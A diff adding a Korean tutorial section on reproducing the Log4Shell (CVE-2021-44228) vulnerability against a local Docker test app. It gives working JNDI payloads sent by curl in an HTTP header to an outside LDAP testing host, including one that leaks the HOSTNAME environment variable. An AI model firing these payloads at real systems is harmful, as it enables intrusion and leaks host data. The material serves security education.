@@ -117,6 +117,54 @@ ${jndi:ldap://MALICIOUS_LDAP_SERVER/COMMAND}
 
 ## 실습
 
+### Log4j 취약점을 이용해 LDAP 서버로 통신하기
+
+Docker 컨테이너로 취약한 Log4j 환경을 구축하고 해당 악의적인 LDAP 서버로 패킷을 보내는 request를 보내볼 것이다.
+Docker 가 설치되어 있다고 가정하고 일단 아래 명령어를 통해 취약한 Log4j 환경이 구축된 이미지를 받고 컨테이너를 올려보자.
+
+```
+docker run --name vulnerable-app -p 8080:8080 ghcr.io/christophetd/log4shell-vulnerable-app
+```
+
+이미지를 다운받고 8080 포트로 해당 컨테이너의 8080포트를 포트포워딩 해 주었다.
+웹 브라우저를 통해 ***http[:]//127.0.0.1:8080*** 로 접속하였을때 아래와 같은 화면이 뜬다면
+정상적으로 컨테이너가 올라온 것이다.
+
+![log4j_vul_container](/assets/images/2022/2022-06-04-23-18-37.png)
+
+취약한 환경을 구축하였으니 이제 exploit을 해볼 차례다.
+[https://log4shell.huntress.com/](https://log4shell.huntress.com/){: target="_blank"}란 사이트에서는 Log4j 취약점이 제대로 동작하는지에 확인할 수 있는 LDAP 서버를 제공한다.
+
+아래의 패킷을 취약한 Log4j 환경에 던지면 해당 LDAP 서버로 연결되는 것을 확인해볼 수 있다.
+unique identifier 의 경우 자신에게 할당된 값을 넣으면 된다.
+
+```
+${jndi:ldap://log4shell.huntress.com:1389/(unique_identifier)}
+```
+
+이제 curl 같은 도구를 이용하여 아래 request를 날려주면 된다.
+HTTP Header 컬럼 중, 'X-Api-Version'라는 컬럼에 Exploit을 삽입해 주었다.
+
+```
+curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://log4shell.huntress.com:1389/5d7cf9a3-6fcb-46b4-ba90-605972bba32d}'
+```
+
+![log4j_exploit](/assets//images/2022/2022-06-04-23-35-59.png)
+
+이후 LDPA 서버를 제공해주는 사이트를 확인해보면 아래와 같이 로그가 남는다.
+
+![log4j_exploit_result](/assets/images/2022/2022-06-04-23-37-58.png)
+
+추가적으로 아래와 같은 명령어를 이용해 PC의 환경변수 값을 노출하는 것도 가능하다.
+
+```
+${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/(unique_identifier)}
+```
+
+아래와 같이 호스트의 환경변수 값이 노출된 것을 확인할 수 있다.
+
+![log4j_exploit_result2](/assets/images/2022/2022-06-04-23-41-11.png)
+
 ## Reference
 - [Log4j 보안 문제와 해킹 과정 재현하기 (feat. CVE-2021-44228)](https://junhyunny.github.io/information/security/log4j-vulnerability-CVE-2021-44228/){: target="_blank"}
 - [아파치 로그4j 취약점에 영향 받는 Log4j Core 공개](https://www.boannews.com/media/view.asp?idx=103419){: target="_blank"}
